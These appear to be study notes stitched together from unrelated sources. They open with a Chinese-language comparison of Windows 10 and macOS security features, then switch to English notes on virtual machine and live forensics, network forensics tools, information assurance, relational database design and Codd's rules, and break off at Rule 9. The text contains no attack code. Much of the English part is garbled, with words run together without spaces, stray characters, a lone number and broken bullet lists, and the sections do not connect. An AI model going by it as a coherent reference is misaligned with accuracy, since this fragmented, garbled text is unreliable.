如果不能保护数据，OS 安全也就没有意义了。微软⻓期以来都有 文件及文件夹加密 ( Encrypting File System ) 功能，并在 Vista 里 添加了以 BitLocker 实现的磁盘卷加密。终极加密密钥可以存储在 TPM 硬件芯片、网络、可移动媒体和其他地方。Vista 之后的 Windows系统增加了其他加密功能和选项，包括使用 BitLocker To Go 对可移动媒体加密和要求可移动媒体必须加密。通过设置 加密选项，系统管理员可以规划什么样的可移动媒体能够在本机 安装并使用。
macOS:
如前文提到的，macOS可用 FileVault 2 加密启动盘以防止未授权 访问。通过固件口令，Mac 机可设置为不能从外部设备启动。 FileVault 2 采用 128 位块大小的 AES 256 加密算法 AES-XTS 模式 进行加密。配合可防止以组合键绕过启动盘启动的固件口令，经 FileVault 2 以强口令整盘加密的磁盘基本上是不可能被破解的。
如果磁盘被转到另一台 Mac 机，可以使用恢复密钥，或者用户有 解锁权限也行。恢复密钥可保存在管理系统里，比如 JAMF，或 者存储在苹果的 iCloud 服务器上躲在 Apple ID 保护之后也可以。
可以使用 macOS 原生 Disk Utility 应用来加密外部磁盘或创建加 密磁盘镜像。
6. 文件完整性保护 Windows 10:
Windows有很多功能都可以为OS和用户数据文件提供完整性保 护。Windows ME 引入了名为 System File Protection (系统文件 保护:SFP)的OS文件保护进程。一旦系统重要文件被删除，SFP 可确保Windows系统能立即以已知良性的文件副本加以替换。 Windows Vista 对SFP进行了升级，演变成还能保护重要Windows 注册表设置的 Windows Resource Protection (Windows资源保护) ——虽然被保护和自动替换的东⻄整体减小了。
Vista还引入了 Mandatory Integrity Controls (强制完整性控制: MIC)和文件及注册表虚拟化。MIC会为Windows中每个用户、文 件和进程显式分配MIC级别(高、中、低)，低级别MIC对象不能修 改高级别MIC对象。在文件和注册表虚拟化保护下，大多数OS重 要文件和注册表设置都可抵御低权限用户或进程的修改尝试，低 权限用户或进程所做的修改只作用于虚拟出来的额外文件或注册 表副本，真正的系统重要文件和注册表设置是不受影响的。
在 Windows 8 中，PC Reset (PC重置)和 PC Refresh (PC刷新)功 能可供用户重置设备到全新状态 ( PC Reset ) 或近全新状态 ( PC Refresh:保留用户文件、设置和某些应用)。如果你担心中了恶意 软件，最好将系统重置到已知干净状态。
macOS: 2015年 El Capitan 中引入的 System Integrity Protection (系统完 整性保护:SIP)，解决的是恶意软件或黑客获取到账户凭证后的 无限制root权限问题。SIP保护特定重要文件和目录的内容和权 限，即便以root执行也无法动作。未签名的内核扩展在SIP保护下 无法运行;如果没有特定权益，进程代码注入和实时代码修改也 无法实现。只有经恰当签名的应用才可以修改受保护的系统目 录，而这些应用必须关联开发者ID，且具备苹果签发的权益。
7. 加密支持
Windows 10: 从 Windows Vista 开始，微软不再尝试自主研发加密密码和算 法，转而部署广受推崇的密码体制 (比如 ECC 和 SHA-2)，并经常 加以更新以防弱密码攻击和支持新兴加密算法。
macOS:
T2芯片使用硬件加密的 Secure Enclave (安全⻜地)存储Mac的加 密密钥(传给同一块芯片上的硬件加密引擎处理)。T2芯片集还控制 着2块用于存储的NAND闪存，包含了实时无损加/解密数据的专用 AES加密硬件。
T2芯片集在Mac机启动过程中确保操作系统软件不被破坏。在启 动时，T2芯片接管启动过程，用其硬件加密的 Secure Enclave 来 比对密钥，加载引导程序，确保其有效性，验证固件，然后验证 让Mac机真正跑起来的内核和驱动程序。
8. 磁盘/数据备份和恢复 Windows 10: 每个版本的 Windows 都有多种备份和恢复文件的方法。自 Windows XP 开始，用户可使用 System Restore (系统恢复)功能 将 OS 和各种设置恢复到之前保存的 OS 版本。“先前版本”功能在 Windows XP 时代还只是可选项，到了 Windows 8 就已内置进系 统，可以从之前保存的版本中恢复出个别文件——只要之前的“先 前版本”保存过程覆盖了这些文件。
从 Windows 8 开始，就可以使用名为 File History (文件历史)的备 份及恢复功能了。虽然不是完整的系统备份，File History 却往往 正好是用户所需的，尤其是在 Windows 操作系统已经可以单独恢 复的情况下。File History 默认备份用户最常用于保存文件和配置 的地方，比如“我的文档”、“音乐”、“文档”、“视频”、“桌面”、“下 载”和“应用数据”等，但是用户也可自行纳入或排除文件及文件夹 并制定备份日程。
macOS: 2007年开始，Mac机就预装了 Time Machine (时光机)服务，让备 份过程简单易行，设置好后就再也不用管了。如果 Time Machine 尚未设置，插入硬盘就会弹出设置对话框，供用户将该硬盘设置 为备份目标盘。一旦确认，备份过程即展开。
1天之内的数据按小时保持备份，1个月之内的数据按天保存备 份，1个月之前的数据会被 Time Machine 整合进周备份集合。如 果备份存储空间告急，Time Machine 会删除最早的周备份以匀出 空间。System Preferences (系统偏好设置)中可以修改 Time Machine 的设置。
9. 应用保护 Windows 10:
Windows Vista 开始，微软对应用间互操作和应用对操作系统本 身的操作就管束得特别严格了。Vista在操作系统、服务和终端用 户应用之间进行了严格的隔离。到了 Windows 8，微软又更进一 步，创建了名为Metro的一类防护更严的应用。这类应用最终得名 Modern Applications (现代应用)。
遵循苹果公司的前例，只能通过 Microsoft Store (微软应用商店) 安装经过官方审核通过的 Modern Applications。所有此类应用都 在专⻔的沙箱容器中执行，相互间只有有限的访问权限，与操作 系统的互动也有限，且只有启用了 UAC 才可以执行。
Windows Defender Application Guard 连同Edge浏览器一起随 Windows 10 面世。Edge与其托管的站点和应用如今均在基于 VBS的虚拟环境中运行，与操作系统本身是隔离的。Application Guard 中打开的会话无法启动浏览器扩展，不能保存文件到本地 文件系统，也不能执行其他高⻛险操作。有传言说 Application Guard 将来会支持更多应用。
控制哪些应用能执行哪些不能执行一直以来都是保证高度安全的 有效方式 (比如应用控制、黑名单、白名单)。微软在 Windows XP 中引入了名为 Software Restriction Policies (软件限制策略: SRP) 的应用控制措施。Vista 之后，SRP 被 AppLocker 取代。二 者都可使管理员能够按照名称、位置或数字证书等条件设置程 序、脚本或安装包运行与否。
Windows 10 中，CI和 Device Guard 融进了 Windows Defender Application Control (WDAC)，基于硬件强制实施非常细致具体的 允许或拒绝策略。管理员可以根据自身环境确定适用的应用控制 级别，还能在AppLocker、CI、Device Guard和WDAC中任选。这 些功能将具有恰当的控制级别并在用户权限范围内做出一些操作 上的权衡。
macOS:
领先潜在黑客一步的最简单有效方式就是保持操作系统软件和应 用更新。App 应从可信源下载，比如供应商的主站点，或者更可 信的 Mac App Store。
Mac App Store 存在于 /Applications 应用目录，里面的每个App 都经过了苹果员工的审核并签署有数字证书。一旦App被曝行为 不当，苹果可终止该App。相对其他选择，Mac App Store 是应 用下载最安全的地方了。
但问题是:不是每个应用都能在 Mac App Store 找到，有时候不 得不从第三方站点下载。这个时候，Gatekeeper 就派上用场了。 Gatekeeper 是软件数字签名检查器，可以在软件数字签名验证失 败时终止软件的安装过程。App 需经苹果代码签名才可以执行， 通过了代码检查的应用就能正确执行。 Gatekeeper在 Security & Privacy System Preference (安全&隐私 系统偏好)面板中设置，有两个App下载源选项:1. App Store (应 用商店);2. App Store 和确定的开发人员。代码检查失败也想安 装软件的时候，Security & Privacy 偏好可手动覆盖，但只有在确 定软件来自可信源的时候才可以这么干。
App沙箱可限制App对系统资源、数据和其他App的访问，也就限 制了恶意软件可能造成的破坏。然而，沙箱的优势也是其劣势， 不是每个应用都支持该功能。很多内置App(包括内置的Web浏览 器Safari)都提供沙箱保护。
macOS High Sierra 中值得一提的另一个安全功能是:应用安装 的任意内核扩展都需要显示授权才可以执行。这可以有效减小恶 意软件偷偷潜入未授权软件中的可能性。 10. 浏览器保护
Windows 10:
微软在 Windows 10 中把 IE 浏览器换成了 Edge。作为一款十分精 简的浏览器，Edge 并未与 IE 共享太多代码。该浏览器不运行传统 高⻛险浏览器插件，只接受来自 Microsoft Store 的经审核扩展， 还具备一键设置重置功能 (以防潜在恶意修改)，并可纳入 Windows Defender Application Guard 模式。
每个网站和下载项都要经过 Windows Defender Smartscreen 筛 选器的评估，该筛选器不仅仅针对浏览器，而是整个 Windows 10 操作系统都适用。Edge的代码量和暴露面均大幅减少，因而 对应用和网站的可执行动作也就限制更严格。相对 IE 而言，可谓 巨大的进步。 macOS:
每部 Mac 都预装了 Safari 浏览器，附带反网络钓⻥技术、防跨站 跟踪设置和链向 iCloud Keychain 密码管理系统的强口令生成器。
11. 网络/无线保护
Windows 10:
微软向来引领网络和无线安全技术潮流。除了⻓期支持无线和网 络标准，微软还常常早期采用这些标准并在大多数用户尚未准备 好之前就加以推出 (比如 IPv6 和 DNSSEC)。⻓期以来，Windows 中内置一项网络防御功能，是任意网络或无线连接的单独管理能 力。Windows 可为每个连接分别配置不同的防火墙、路由器和其 他安全设置。
12. 反恶意软件 Windows 10:
Windows Defender Antivirus 已被证明是顶级无干扰反恶意软件程 序，尤其是以默认状态部署并配合Windows的其他反恶意软功能 使用的时候，比如Smartscreen和Exploit Guard。采用名为 Early Loading Antimalware (早期启动防病毒:ELAM)的功能， Windows可使任意反恶意软件程序先于其他非基本应用，紧跟在 关键OS引导进程之后加载。
macOS: 2017年4月，CheckPoint安全研究员发现有恶意软件可绕过 Gatekeeper。5月，流量视频转码器Handbrake被黑，受感染版本 携OSX.PROTON远程访问木⻢散布。攻击越来越复杂，处理潜在 数据泄露的机制也随之越来越复杂。
在 Mac 机上，可路由网络服务默认是禁用的，很多现代应用和服 务也是在沙箱中运行。这意味着 App 和系统服务对系统资源只有 有限访问权;恶意代码不能与其他 App 或系统互操作。
苹果还有更为极端的方式对抗恶意软件。通过静默自动更新，苹 果在每台 Mac 机上都维护着一份已知恶意软件威胁的黑名单。 Safari、Message 和 Mail 下载的每一个文件都附带有元数据，表 明该文件是否安全、文件下载的源地址和下载当时的时间戳。任 何被标为不安全的文件在打开时都会弹出警告信息，用户可选择 直接将该文件投入回收站。 特定程序及任何相关文件都会被自动删除，该程序所做的任何修 改都会被记录并撤销。如果该操作切实发生了，管理员用户下次 登录 Mac 时就会收到“已发生改动”的通知。
13. 防火墙
Windows 10:
自 Windows XP SP2 起，Windows系统便默认安装了一直开启的 Windows Firewall (Windows防火墙)。Windows Firewall 有数十条 内置规则，拒绝一切非例外处理的入站连接，允许用户、组、管 理员、网络、服务或应用创建额外的规则。Windows Firewall 不 对用户产生太多干扰，而且是通用的，也很容易与 IPSEC 一起配 置。唯一的缺点就是糟糕的日志记录 (有时候是太多了) 和缺乏重 大已确认即时安全事件的通告，比如拒绝服务攻击或端口扫描 等，而这些正是其他第三方防火墙通常所具备的。
macOS:
所有 Mac 机发售时都已内置防火墙服务，但默认是关闭的。可通 过 Security & Privacy System Preference (安全&隐私系统偏好)面 板配置该防火墙，可以启用 Stealth Mode (隐身模式)让计算机无 视 ICMP 请求和连接尝试。
14. 远程访问
Windows 10: 虽然微软建议所有远程管理都通过PowerShell或 Microsoft Management Consoles (微软管理控制台:MMC)进行，但 Remote Desktop (远程桌面) 控制台及协议 (RDP) 依然是管理员们 远程访问 Windows 计算机的最常⻅方式。RDP 已历经多次升级， 如今用户可以数字证书身份验证连接，并使用 Windows Defender Credential Guard 保护管理员凭证。
macOS:
Mac支持多种远程访问协议，包括对SSH和sftp的原生支持。用户 也可通过 Apple Remote Desktop (苹果远程桌面)远程管理Mac 机，远程屏幕共享则可通过对VNC的原生支持实现，而iCloud订 阅用户还可启用 Back to my Mac (回到我的Mac)从任意一台以相 同 Apple ID 登录的Mac机远程访问自己的Mac。 15. 安全配置
Windows 10:
本地安全策略在 Windows NT 4 SP4 中就已引入，并以 Active Directory Group Policies (活动目录组策略)在 Windows 2000 和 XP 中进行了大幅扩展。今天，没有哪个操作系统像 Windows 一样 有那么多内置的点击式安全配置选项。Windows 操作系统和其他 流行应用 (比如 Office 办公套件) 有数千种安全设置可用。管理员可 用 PowerShell 脚本完成他们可以手动或使用组策略来完成的事 情。 16. 修复
Windows 10:
Windows操作系统和微软应用程序修复是内置并默认开启的。 Windows至少每天都会检查有没有新的补丁，默认自动应用这些 补丁而无需管理员或中断用户的干预。新安装使用一组不容易关 闭的内置硬编码防火墙规则，这些规则可保护PC抵御大多数网络 攻击，同时又可及时获取补丁进行修复。这得感谢2003年的MS- Blaster(冲击波)蠕虫，若非这款让管理员不得不先感染了才能实施 修复的蠕虫，微软的修复策略和过程也不会是现在的样子。
macOS:
苹果一贯在修复重大漏洞利用上反应迅速。 17. 隐私
Windows 10:
背着侵犯终端用户隐私的骂名几十年后，微软如今是隐私权的强 力支持者，提供各种各样的个性设置，管理员或用户可甚为细致 地决定哪些信息可以被收集而哪些不可以。
macOS:
苹果高管一直走在用户隐私问题最前列，某些情况下，为了保护 用户数据，甚至不惜公然与联邦政府对垒。苹果不收集转卖用户 数据，指纹、人脸数据之类安全信息从不漏出苹果设备，苹果的 隐私政策直截了当，令人耳目一新，值得一读。
18. 日志 Windows 10:
根据安装的功能和服务，微软产品有几十种日志文件可供安全分 析。其中最中心的是 Windows Event Log (Windows事件日志)服 务。以前该服务包含 3 个主要日志 (安全日志、系统日志和应用日 志)，如今，其所含日志数量已超 100，且是可配置的 XML 详细日 志。日志或具体事件可以转发给其他收集器并触发控制台消息或 其他应用程序。若说有什么美中不足，那就是记录了太多太多微 不足道的事件。在计算机安全界，噪音太多的问题比缺乏足够的 有用信息更严重。
macOS:
去年推出的 macOS Sierra 引入了统一日志系统，为了提供统一高 效的 API 来捕捉并存储所有系统和应用活动。可配置日志记录不 同程度的细节，这些记录下来的数据可用内置的 Console 应用查 看。
Virtual Machine Forensics, Live Acquisitions, and Network Forensics Investigation with Type 2 Hypervisors
1. acquiring a forensic image of the host computer
Example:
network logs: By linking the VM’s IP address to log files, you may determine what Web sites the VM accessed.
2. Locate the virtualization software and VMs, using information learned about file extensions and network adapters
detect whether a VM is on a host computer:
  - Look in the Users or Documents folder (in Windows) or user directories (in Linux)
  - Check the host’s Registry for clues that VMs have been installed or uninstalled   - Existence of a virtual network adapter
 ⁃
  - determine whether USB drives
have been attached to the host   - They could have live VMs
running on them
  - A VM can also be nested
inside other VMs on the host machine or a USB drive
  - Some newer Windows
systems log when USB drives
are attached
  - Search the Windows Registry
or the system log files 3. Export from the host machine all files associated with VMs
4. Record the hash values of associated files
5. Open a VM as an image file in forensics software and create a forensic image or mount the VM as a drive
VM Examination Methods
– FTK Imager and OSForensics can
mount VMs as an external drive
By mounting a VM as a drive, you can
make it behave more like a physical
computer
Allows you to use the same standard
examination procedures for a static
hard drive
– Make a copy of a VM’s forensic image
and open the copy while it’s running Start it as a live VM so that forensics software can be used to search for
clues Performing Live Acquisitions Live acquisitions 获得者 :
useful for active network intrusions or attacks
done before taking a system offline is necessary.
  - Attacks might leave footprints only in running processes or RAM.
Live acquisitions don’t follow typical forensics procedures.
Order of volatility 􏰘发性 (OOV)
– How long a piece of information lasts
on a system.
Steps
Create or download a bootable forensic CD
keep a log of all your actions
send the information you collect (like
network drive)
Copy the physical memory (RAM) The next step varies, depending on the incident you’re investigating
get a forensic digital hash value of all files recoved during the live acquisition.
Performing a Live Acquisition
in Windows
Several tools are available to capture the RAM.
– Mandiant Memoryze
– Belkasoft RamCapturer
– Kali Linux (updated version of
BackTrack)
GUI tools are easy to use
– require a lot of system resources
Might get false readings in Windows OSs
Command-line tools give you more control  Data acquisition:
For memory volatility, Swap/pagefile and RAM should be captured.
Network Forensics Overview
Network forensics
– Processofcollectingandanalyzingrawnetwork data and tracking network traffic.
To ascertain 查明 how an attack was carried out or occurred on a network.
Intruders leave a trail behind
Knowing your network’s typical traffic patterns to spot
the variations in network traffic
The Need for Established Procedures
Network forensics examiners must establish standard procedures (how to acquire data after attack/intrusion)
– Toensureallcomprisedsystemshavebeenfound
based on an organization’s needs and complement network infrastructure
NIST created “Guide to Integrating Forensic Techniques into Incident Response” to address these needs Securing a Network
Layered network defense strategy – Setsuplayersofprotection
Defense in depth (DiD)
– SimilarapproachdevelopedbytheNSA – Modesofprotection
People Technology Operations
Developing Procedures for Network Forensics
Network forensics can be a long, tedious process
Standard procedure:
– Alwaysuseastandardinstallationimagefor
systems on a network
– Fixanyvulnerabilityafteranattack
– Attempttoretrieveallvolatiledata
– Acquireallcompromiseddrives
– Comparefilesontheforensicimagetotheoriginal
installation image In digital forensics
work from the image
to find most of the deleted or hidden files and
partitions
In network forensics
– Youhavetorestoredrivestounderstandattack Work on an isolated system – Preventsmalwarefromaffectingothersystems
Reviewing Network Logs
Network logs record ingoing and outgoing traffic – Networkservers
– Routers
– Firewalls
Tcpdump and Wireshark
– toolsforexaminingnetworktraffic – Cangeneratetop10lists
– Canidentifypatterns
Sysinternals tools
– AcollectionoffreetoolsforexaminingWindows products
– Examples:
– RegMon:showsRegistrydatainrealtime
– ProcessExplorer:showswhatisloaded
– Handle:showsopenfilesandprocessesusing
them
– Filemon:showsfilesystemactivity
Tools from PsTools suite created by Sysinternals – PsExec:runsprocessesremotely
– PsGetSid:displayssecurityidentifier(SID) – PsKill:killsprocessbynameorID
– PsList:listsdetailsaboutaprocess
– PsLoggedOn:showswho’sloggedlocally – PsPasswd:changesaccountpasswords
– PsService:controlsandviewsservices
– PsShutdown:shutsdownandrestartsPCs – PsSuspend:suspendsprocesses Using Packet Analyzers
Packet analyzers
– Devicesorsoftwarethatmonitornetworktraffic – Mostworkatlayer2or3oftheOSImodel
Most tools follow the Pcap (packet capture) format
Some packets can be identified by examining the flags in
their TCP headers
Tools
   Tcpdump
   Tethereal
   Tcpslice
   Tcpreplay
   Tcpdstat
   Ngrep
   Etherape
   Netdude
   Argus
   Wireshark 636
focuses on processing, storing, ensuring the availability of and sharing information assets
- covers all hardware and software used for information storage, transmission and processing
Information assurance
only ensures the approved entities receive the accurate information they require when they need it.
protecting information and services against disclosure, transfer, modification, or destruction (intentional or unintentional).
ensuring the availability of information in a timely
Information Technology: manner.
also considers the authentication used in a system and how strongly actions can be repudiated.
concerned with the life cycle of information in an organization through the objectives of maintaining the Confidentiality, Integrity, Availability, Nonrepudiation, and Authentication
Subsets:
  - Information security
  - information protection:
  - protection the confidentiality and integrity of information through a variety of means such as policy, standards, physical controls, technical controls, monitoring, and information classification or categorization   - cybersecurity.:
  - the measures taken to protect networks and electronic information systems against unauthorized access or attack.
  - often focuses on the vulnerabilities and threats of an information system at the tactical level.
  - System scanning, patching, and secure configuration enforcement are common foci of cybersecurity
The MSR Model of Information Assurance
  In 2001, the Maconachy-Schou-Ragsdale model described:
three states of information: storage, transmission, and processing;
three essential countermeasures: technology, policy, and people;
five basic services: availability, integrity, confidentiality, authentication, and nonrepudiation
also has a Time dimension, should be maintained for information life cycle.
  The Association for Computing Machinery (ACM) adopted this model as an extension of the basic CIA model  Information Assurance Principles
Be a business enabler
Protect the interconnecting element of an organization’s systems
Be cost effective and cost beneficial Establish responsibilities and accountability Require a robust method.
Be assessed periodically.
Be restricted by social obligations.
Information Assurance Concepts
  Confidentiality   Integrity
  Availability
  CIA balance   Nonrepudiation
  Identification, Authentication, Authorization, and Accountability   Cryptology
  Assets
  - anything valuable to the organization, tangible or intangible (hardware, software, data, services, and people)
  Threats
  - potential events that may cause the loss of an information asset. A threat may be natural, deliberate, or accidental
  Vulnerabilities
  - weaknesses that can be exploited by (emerging)
threats.   Risks successfully exploiting a vulnerability that will eventually affect the organization
  Controls
  - protective measures or mechanisms that reduce
risks.
Information Assurance Concepts
  Categories of Controls
  Management controls: security controls that are strategic and suitable for planning and monitoring purposes.
  - example, policies, and rules
  Operational controls: used in day-to-day operations to ensure the secure execution of business activities.   - example, tools for IT supports and operations, etc.
  Technical controls: possible technical and physical implementation of information assurance solutions and recommendations.
  - example, access controls, security audit and monitoring tools
Information Assurance Management System (IAMS)
  Information assurance is an ongoing process
  technology is not enough, must have a set of well- designed policies and procedures serving as the foundation of information assurance initiatives, and provide security considerations for the information asset life cycle   Plan-Do-Check-Act Model: process of managing security throughout the life cycle
  Plan: establish the IAMS
  Do: implement, operate, and maintain the IAMS
  Check: monitor and review the IAMS
  Act: execute, maintain and improve the IAMS
Information Systems
An information system (IS) is an organized system for the collection, organization, storage and communication of informatio
3 activities of information systems produce information organizations need
  - Input: Captures raw data from organization or external environment
  - Processing: Converts raw data into meaningful form
  - Output: Transfers processed information to people or
activities that use it
Database
  A Database is an organized collection of data.
  For security and performance: database usually stored in protected files (in binary and text), and provide logical views for its users as a management system.
  Physically, a database can be directly stored in text, binary files.   Examples for file-based database: flat text files, XML files, and so on.
Relational Database
  Relational Database: collection of data organized in schemas, tables, queries, views and other elements.
  relational database is managed by a Database Management System (DBMS)
a computer software application.
interacts with end-users, other applications, and the database itself to capture, process and analyze data.
allows the definition, creation, querying, update, and administration of databases.
Well-known DBMSs: Oracle, MS SQL Server, IBM DB2, Sybase, MySQL, PostgreSQL, MongoDB, EnterpriseDB, MariaDB, SAP HANA, MemSQL, SQLite, and so on
DBMS Characteristics
  A modern DBMS has the following characteristics
  Real-world entity: realistic and uses real-world entities,
behavior, attributes too.
  Relation-based tables: DBMS allows entities and relations among them to form tables. A user can understand the database just by looking at the table names.
  Isolation of data and application: database system is different from data. A database is an active entity, whereas data is said to be passive, on which the database works and organizes. DBMS also stores metadata, which is data about data, to ease its own process.   Less redundancy: DBMS follows the rules of normalization, which splits a relation when any of its attributes is having redundancy in values. Normalization is a mathematically rich and scientific process that reduces data redundancy.
  Consistency: Consistency is a state where every relation in a database remains consistent. There exist methods and techniques, which can detect attempt of leaving database in inconsistent state. A DBMS can provide greater consistency as compared to earlier forms of data storing applications like file- processing systems
  Query Language: DBMS is equipped with query language, more efficient to retrieve and manipulate data. A user can apply filtering options as required to retrieve set of data
  Multiuser and Concurrent Access: DBMS supports multiuser environment and allows them to access and manipulate data in parallel. Though there are restrictions on transactions when users attempt to handle the same data item, but users are always unaware of them
  Multiple views: DBMS offers multiple views for different users. A user who is in the Sales department will have a different view of database than a person working in the Production department. This feature enables the users to have a concentrate view of the database according to their requirements
  Security: Features like multiple views offer security to some extent where users are unable to access data of other users and departments. DBMS offers methods to impose constraints while entering data into the database and retrieving the same at a later stage. DBMS offers many different levels of security features, which enables multiple users to have different views with different features.
  ACID Properties: DBMS follows the concepts of Atomicity, Consistency, Isolation, and Durability (normally shortened as ACID). These concepts are applied on transactions, which manipulate data in a database. ACID properties help the database stay healthy in multi-transactional environments and in case of failure
  Atomicity: transaction must be treated as an atomic unit, either all or none
  There must be no state in a database where a transaction is left partially completed.
  States should be defined either before the execution of the transaction or after the execution/abortion /failure of the transaction.
  Consistency: The database must remain in a consistent state after any transaction
  No transaction should have any adverse effect on the data residing in the database   If the database was in a consistent state before the execution of a transaction, it must remain consistent after the execution of the transaction as well
  Isolation: multi transaction are executed simultaneously and in parallel, isolation states that all the transactions will be carried out and executed as if it is the only transaction in the system
  No transaction will affect the existence of any other transaction
  Durability: The database should be durable enough to hold all its latest updates even if the system fails or restarts.
  If a transaction updates a chunk of data in a database and commits, the database will hold the modified data
  If a transaction commits but the system fails before the data could be written on to the disk, that data will be updated once the system springs back into action
DBMS Users
  Administrators: maintain the DBMS, responsible for administrating database
  responsible to look after its usage and by whom it should be used
  create access profiles for users and apply limitations to maintain isolation and force security
  also look after DBMS resources like system license, required tools, and other software and hardware related maintenance
  Designers: designing part of the database
  They keep a close watch on what data should be kept and in
what format. They identify and design the whole set of entities, relations, constraints, and views
  End Users: who actually reap the benefits of having a DBMS
  End users can range from simple viewers who pay attention to the logs or market rates to sophisticated users such as business analysts
  End users may directly use DBMS through the query language, or access DBMS through an application that provides application level user interface for end users to use
Entity-Relationship Model
  define how the logical structure of a database is modeled   are fundamental entities to introduce abstraction in a DBMS
  define how data is connected to each other and how they are processed and stored inside a database system Attributes
  Types of Attributes: Attributes can be different types
  Simple attribute: atomic values, cannot be divided further.
  - Example, phone number is an atomic value of 10 digits.   Composite attribute: are made of more than one simple
attribute.
  - Example, complete name have first_name and last_name
  Derived attribute: attributes that do not exist in the physical database, but their values are derived from other attributes present in the database
  - Example:
  - average_salary should not be saved directly, it can be derived.
  - age can be derived from date_of_birth.   Single-value attribute: contain single value.
  - example: Social_Security_Number
  Multi-value attribute: may contain more than one values.
  - example, a person can have more than one phone number, email_address, etc.
  These attribute types can come together in a way like: simple single-valued attributes
simple multi-valued attributes composite single-valued attributes composite multi-valued attributes Key
  Entity-Set and Keys: Key is an attribute / collection of attributes that uniquely identifies an entity among entity set.
  - Example, the Student_ID, identifiable among students   Super Key: A set of attributes (one or more) that collectively
identifies an entity in an entity set
  Candidate Key: A minimal super key is called a candidate key. An entity set may have more than one candidate key
  Primary Key: A primary key is one of the candidate keys chosen by the database designer to uniquely identify the entity set
Weak Entity   Weak Entity: entity not have its own primary key.
  The primary key of a weak entity depends on its parent entity
  The weak entity must use the parent entity’s primary key (a foreign key of the weak entity) in conjunction with its attributes to create a primary key
Entity-Relationship
  Relationship: The association among entities is called a relationship
  example, an employee works_at a department, a student enrolls in a course. Here, works_at and enrolls are called relationships
  Relationship Set: A set of relationships of similar type is called a relationship set. Like entities, a relationship can have attributes too. These attributes are called descriptive attributes
  Mapping Cardinalities: Cardinality defines the number of entities in one entity set, which can be associated with the number of entities of other set via relationship set
  One-to-one: One entity from entity set A can be associated with at most one entity of entity set B and vice versa
  One-to-many: One entity from entity set A can be associated with more than one entities of entity set B, however an entity from entity set B can be associated with at most one entity
  Many-to-one: More than one entities from entity set A can be associated with at most one entity of entity set B, however an entity from entity set B can be associated with more than one entity from entity set A
  Many-to-many: One entity from A can be associated with more than one entity from B and vice versa
ER Diagram Representation
   An entity: a single-lined Rectangle in the ER diagram   -   An entity may have multiple attributes
  An attribute: an Ellipse in the ER diagram
  -   If the attributes are composite, they are further divided in a tree like structure. Every node is then connected to its attribute. That is, composite attributes are represented by ellipses that are connected with an ellipse
  Multivalued attribute: double ellipse
  Derived attributes: dashed ellipse
  primary key: underlined in the ER diagram
  weak entity: a double-lined Rectangle in ER diagram.
  Relationships: diamond-shaped box.   Name of the relationship is written inside the diamond- box
  All entities (rectangles) participating in relationship are connected to it by a line
  binary relationship: relationship two entities are participating.   Cardinality is the number of instance of an entity from a
relation that can be associated with the relation.
  One-to-One / One-to-Many / Many-to-One / Many-to-Many: marked as '1:1' ‘1:N’ ’N:1’ ’N:N’
   Participation Constraints
  Total Participation: Every entity is involved in the relationship. double lines
  Partial participation: Not all entities are in the relationship. single lines
 Relation Schema
  After ER diagram, we list all relation schema.
  The rules for listing relation schema is as follows:
For each entity, we need to create a relation (a table in database).   - The primary key: the entity’s primary key.
  - If a weak entity, the primary key is a combination of the
parent entity’s primary key and some attributes.
Only many-to-many relationship, we need to create a relation.
  - The primary key: the combination of two entity primary keys.
  - Also these two primary keys of two related entities become two foreign keys of the relation from the relationship
For one-to-many, many-to-one relationship, do not need to create relation.
  - Instead, we only need to add the primary key of the one side entity into the relation from the many side entity as a foreign key of relation
For one-to-one relationship, we do not need to create a relation.
  - We can add the primary key of either one side entity to the relation from another one side entity as a foreign key of relation
Relational Model
  The most popular data model in DBMS is the Relational Model.
  This model is based on first-order predicate logic and defines a table as an n-ary relation
  The main highlights of this model are:
  Data is stored in tables called relations   Relations can be normalized
  values saved are atomic values
  row: unique value
  column: values from same domain Relational Model - Concepts
  Tables: In relational data model, relations are saved in the format of Tables. This format stores the relation among entities. A table has rows and columns, where rows represent records and columns represent the attributes.
  Tuple: A single row of a table, which contains a single record for that relation is called a tuple
  Relation instance 关系实例: A finite set of tuples in the relational database system represents relation instance. Relation instances do not have duplicate tuples. 表中的记录，包括字段值等
  Relation schema 关系模式: A relation schema describes the relation name (table name),
attributes, and their names. 数据库中 的表结构，也交模式，包括表名，表中的字段等信息
  Primary Key: One or more attributes that contain values to uniquely identify each row
  Foreign Key: One or more attribute of a table, which is a primary key of another related table. 该关系中的某一个属性与另外一个关系中的主键有关联Correspond，则 该关系中的这个属性称为外键
  Attribute domain: Every attribute has some predefined value scope, known as attribute domain
Constraints 系统规定参数
  Every relation has some conditions that must hold for it to be a valid
relation. These conditions are called Relational Integrity Constraints   There are three main integrity constraints:
  - Key constraints
There must be at least one minimal subset of attributes in
the relation, which can identify a tuple uniquely.
primary key for that relation: This minimal subset of attributes candidate keys: more than one such minimal subsets. Key constraints force that:
  - in a relation with a key attribute, no two tuples can have
  - identical values for key attributes
  - a key attribute cannot have NULL values.
  - Key constraints are also referred to as Entity Constraints
Domain constraints
Attributes have specific values in real-world scenario. example, age can only be a positive integer
The same constraints have been tried to employ on the attributes of a relation
Every attribute is bound to have a specific range of values. example, age cannot be less than zero and telephone numbers cannot contain a digit outside 0-9. Referential integrity constraints
work on the concept of Foreign Keys
A foreign key: a key attribute of a relation that can be referred in other relation
if a relation refers to a key attribute of a different or same relation, then that key element must exist
Codd’s Rules
12 rules, can be applied on any database system that manages stored data using only its relational capabilities
This is a foundation rule, which acts as a base for all the other rules
Rule 1: Information Rule
The data stored in a database, may it be user data or metadata, must be a value of some table cell. Everything in a database must be stored in a table format.
Rule 2: Guaranteed Access Rule
Every single data element (value) is guaranteed to be accessible logically with a combination of table-name, primary-key (row value), and attribute- name (column value). No other means, such as pointers, can be used to access data. Rule 3: Systematic Treatment of NULL Values :
  - The NULL values in a database must be given a systematic and uniform treatment.
  - NULL: data is missing, not known, or not applicable. Rule 4: Active Online Catalog
  - The structure description of the entire database must be stored in an online data dictionary, which can be accessed by authorized users.
  - Users can use the query language to access the catalog. Rule 5: Comprehensive Data Sub-Language Rule
  - A database can only be accessed using a language having linear syntax that supports data definition, data manipulation, and transaction management operations.
  - This language can be used directly or by means of some application.
  - If the database allows access to data without any help of this
language, then it is considered as a violation.
Rule 6: View Updating Rule
  - A database, can theoretically be updated, must also be updatable by the system.
Rule 7: High-Level Insert, Update, and Delete Rule
  - A database must support high-level insertion, updation, and deletion. This must not be limited to a single row, that is, it must also support union, intersection and minus operations to yield sets of data records.
Rule 8: Physical Data Independence
  - The data in database must be independent of the applications that access the database.
  - Any change in the physical structure of a database must not have any impact on how the data is being accessed by external applications.
Rule 9: Logical Data Independence
